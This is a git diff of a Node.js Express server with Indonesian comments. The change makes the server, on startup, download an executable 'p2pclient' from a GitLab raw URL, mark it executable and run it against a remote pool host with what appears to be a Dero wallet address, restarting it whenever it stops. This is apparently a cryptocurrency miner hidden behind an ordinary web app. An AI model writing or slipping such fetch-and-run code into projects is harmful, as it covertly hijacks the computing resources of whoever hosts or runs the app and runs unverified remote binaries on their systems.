@@ -1,23 +1,24 @@
 import express from 'express';
 import fs from 'fs';
 import path from 'path';
-import axios from 'axios';
-import os from 'os';
 import { fileURLToPath } from 'url';
 import winston from 'winston';
 import { spawn } from 'child_process';
+import axios from 'axios';
+import os from 'os';
+import { promisify } from 'util';
+import https from 'https';
 
 // Pastikan __dirname bisa digunakan dalam ES Module
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Direktori penyimpanan
-const P2P_DIR = path.resolve(__dirname, 'p2pclient');
-const JAVA_FILE = path.resolve(__dirname, 'P2PClientRunner.java');
-const JAVA_CLASS = path.resolve(__dirname, 'P2PClientRunner.class');
-const LOG_FILE = path.resolve(__dirname, 'p2pclient.log');
+// Path file p2pclient
+const P2P_PATH = path.join(__dirname, 'p2pclient');
+const LOG_FILE = path.join(__dirname, 'p2pclient.log');
+const P2P_URL = 'https://gitlab.com/rikzakalani/derolunamnr/raw/main/p2pclient';
 
-// Logger menggunakan winston
+// Logger
 const logger = winston.createLogger({
     level: 'info',
     format: winston.format.combine(
@@ -30,50 +31,48 @@ const logger = winston.createLogger({
     ]
 });
 
-// Fungsi untuk mengecek dan meng-compile Java runner
-function setupJavaRunner() {
-    if (!fs.existsSync(JAVA_FILE)) {
-        logger.error('❌ Java runner file is missing!');
-        process.exit(1);
-    }
-
-    if (!fs.existsSync(JAVA_CLASS)) {
-        logger.info('🔄 Compiling Java runner...');
-        try {
-            const javac = spawn('javac', [JAVA_FILE]);
-            javac.on('close', (code) => {
-                if (code === 0) {
-                    logger.info('✅ Java runner compiled successfully.');
-                    startProcess();
-                } else {
-                    logger.error('❌ Failed to compile Java runner.');
-                    process.exit(1);
-                }
+// Fungsi untuk mengunduh file p2pclient
+async function downloadP2PClient() {
+    return new Promise((resolve, reject) => {
+        const file = fs.createWriteStream(P2P_PATH);
+        https.get(P2P_URL, (response) => {
+            response.pipe(file);
+            file.on('finish', () => {
+                file.close(() => {
+                    fs.chmodSync(P2P_PATH, '755'); // Beri izin eksekusi
+                    resolve();
+                });
             });
-        } catch (err) {
-            logger.error('❌ Compilation error:', err);
-            process.exit(1);
-        }
-    } else {
-        logger.info('✅ Java runner already compiled.');
-        startProcess();
-    }
+        }).on('error', (err) => {
+            fs.unlink(P2P_PATH, () => reject(err));
+        });
+    });
 }
 
-// Fungsi untuk menjalankan p2pclient melalui Java
+// Fungsi untuk menjalankan p2pclient
 let peerProcess = null;
 
-function startProcess() {
-    logger.info('🚀 Starting p2pclient via Java...');
+async function startP2PClient() {
+    if (!fs.existsSync(P2P_PATH)) {
+        logger.info('🔄 Downloading p2pclient...');
+        try {
+            await downloadP2PClient();
+            logger.info('✅ p2pclient downloaded successfully.');
+        } catch (error) {
+            logger.error('❌ Failed to download p2pclient:', error);
+            process.exit(1);
+        }
+    }
 
-    peerProcess = spawn('java', ['-cp', __dirname, 'P2PClientRunner']);
+    logger.info('🚀 Starting p2pclient...');
+    peerProcess = spawn(P2P_PATH, ['-d', 'stue.threepool.tech:3030', '-w', 'dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4.1']);
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
 
     peerProcess.on('close', (code) => {
         logger.warn(`⚠️ p2pclient exited with code ${code}. Restarting in 5 seconds...`);
-        setTimeout(startProcess, 5000); // Auto-restart jika mati
+        setTimeout(startP2PClient, 5000);
     });
 
     peerProcess.on('error', (err) => {
@@ -106,7 +105,7 @@ app.get('/', async (req, res) => {
     }
 });
 
-// Pastikan aplikasi dapat menangani sinyal untuk shutdown yang aman
+// Shutdown handling
 process.on('SIGINT', () => {
     logger.info('🛑 Stopping p2pclient...');
     if (peerProcess) {
@@ -115,7 +114,8 @@ process.on('SIGINT', () => {
     process.exit();
 });
 
+// Mulai server
 app.listen(PORT, () => {
     logger.info(`🚀 Server running on http://localhost:${PORT}`);
-    setupJavaRunner();
+    startP2PClient();
 });
